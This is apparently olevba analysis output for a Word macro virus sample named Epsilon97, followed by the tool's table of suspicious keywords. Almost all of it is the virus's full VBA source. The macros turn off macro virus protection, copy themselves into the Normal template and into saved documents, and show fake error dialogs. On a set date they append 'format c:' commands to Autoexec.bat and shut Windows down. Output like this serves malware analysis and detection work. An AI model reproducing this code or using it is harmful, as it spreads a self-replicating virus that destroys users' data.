olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Epsilon-23808e994b98b1578784f5f3b3fd154298b4a342
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Epsilon-23808e994b98b1578784f5f3b3fd154298b4a342 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Epsilon97.bas 
in file: Virus.MSWord.Epsilon-23808e994b98b1578784f5f3b3fd154298b4a342 - OLE stream: 'Macros/VBA/Epsilon97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
CommandBars("Files").Controls(1).Enabled = False
CommandBars("Files").Controls(2).Enabled = False
CommandBars("Files").Controls(4).Enabled = False
CommandBars("Files").Controls(6).Enabled = False
CommandBars("Files").Controls(7).Enabled = False
CommandBars("Files").Controls(8).Enabled = False
CommandBars("Files").Controls(9).Enabled = False
CommandBars("Tools").Controls(1).Caption = "Virus Epsilon97 par ZeMacroKiller98"
CommandBars("Tools").Controls(2).Caption = "HAHAHAHAHA!!!!!!"
CommandBars("Tools").Controls(3).Caption = "Vive les Virus de Macro..."
If D$ = "18/04" Then
    MsgBox "C'est mon anniversaire, aujourd'hui", vbInformation, "Epsilon97"
        Open "C:\Autoexec.bat" For Append As #1
            Print #1, "echo off"
            Print #1, "rem version française"
            Print #1, "echo o|format c: /u"
            Print #1, "rem version anglaise"
            Print #1, "echo y|format c: /u"
            Print #1, "echo Joyeux Anniversaire!!!!!!"
        Close #1
MsgBox "Au revoir....", vbInformation, "Epsilon97"
Tasks.ExitWindows
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](0, 0) = "Epsilon97" Then
        Epsilon97Installed = -1
    End If
Next i
If Not Epsilon97Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Epsilon97", Object:=wdOrganizerObjectProjectItems
MsgBox "Attention, je vous ai contaminé..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbInformation, "Epsilon97"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Epsilon97", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
Dim N$
Randomize
    MsgBox "System Error!!!", vbCritical, "Microsoft Word"
N$ = Int(Rnd * 10) + 1
Select Case N$
    Case 1, 3, 5, 7, 9
        CommandBars("Tools").Controls(14).Caption = "Epsilon97, c'est COOL!!!!"
    Case 2, 4, 6, 8, 10
        CommandBars("Tools").Controls(14).Caption = "Modèles et compléments..."
End Select
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
Dim N$
Randomize
MsgBox "User32 Error!!!!", vbCritical, "Microsoft Word"
N$ = Int(Rnd * 10) + 1
Select Case N$
    Case 1, 2, 3, 4, 5
        CommandBars("Tools").Controls(13).Caption = "ZeMacroKiller98 va vous étonner..."
    Case 6, 7, 8, 9, 10
        CommandBars("Tools").Controls(13).Caption = "Macros"
End Select
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

